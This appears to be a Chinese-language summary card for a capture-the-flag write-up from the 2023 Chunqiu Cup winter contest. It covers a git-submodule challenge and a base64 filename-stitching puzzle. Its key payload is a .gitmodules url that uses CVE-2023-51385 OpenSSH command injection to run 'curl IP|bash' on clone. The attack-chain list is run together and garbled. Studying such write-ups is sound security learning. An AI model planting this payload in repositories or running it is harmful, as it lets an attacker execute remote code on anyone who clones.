---
title: "【WP】2023年春秋杯冬季赛 misc、reverse、crypto 类题目解析"
category: misc
tags: ["春秋杯", "misc", "CVE-2023-51385", "OpenSSH-ProxyCommand", "git-submodule", ".gitmodules-url-injection"]
signals: ["春秋杯 2023", "CVE-2023-51385", "OpenSSH-ProxyCommand", "git-submodule", ".gitmodules-url-injection", "base64-filename-stitch", "foremost-file-carve", "who-stole-my-takeout", "misc_unknown", "Misc", "Reverse", "Crypto", "OpenSSH", "ProxyCommand"]
difficulty: medium
source: "https://www.ctfiot.com/159740.html"
tools: ["curl"]
origin: des-import
origin_kind: cards
updated: 2026-10-24
---
# 【WP】2023年春秋杯冬季赛 misc、reverse、crypto 类题目解析

> 赛事：春秋杯 2023 | 方向：misc | 难度：medium | 工具：curl

## 一句话总结

2023 春秋杯冬季赛 Misc/Reverse/Crypto WP，CVE-2023-51385 OpenSSH ProxyCommand 注入 + 外卖文件名 base64 拼图。

## 攻击链

1. 1. modules CVE-2023-51385 OpenSSH ProxyCommand 注入 + .gitmodules url 包含 ssh://`命令`foo.ichunqiu.com/bar/2. who-stole-my-takeout 外卖箱.zip foremost 分离 + 文件名用户X_XXXX= 的外卖 base64 拼 + - 替换为 / / 3. 排序按用户编号拼接 base64

## 关键 payload

```
.gitmodules url = ssh://`curl IP|bash`foo.ichunqiu.com/bar  filename regex = 用户(\d+)_([\w+-=]{4})的外卖
```

## 经验教训

CVE-2023-51385 OpenSSH ProxyCommand %h 未过滤反引号执行命令；.gitmodules url 字段是 git clone 触发 RCE 入口；中文压缩包文件名 cp437→gbk 解码是中文文件名处理技巧。

## 标签

CVE-2023-51385、OpenSSH-ProxyCommand、git-submodule、.gitmodules-url-injection、base64-filename-stitch、foremost-file-carve、who-stole-my-takeout

## 参考来源

- https://www.ctfiot.com/159740.html
- 原文件：【WP】2023年春秋杯冬季赛misc、reverse、crypto类题目解析.full.md
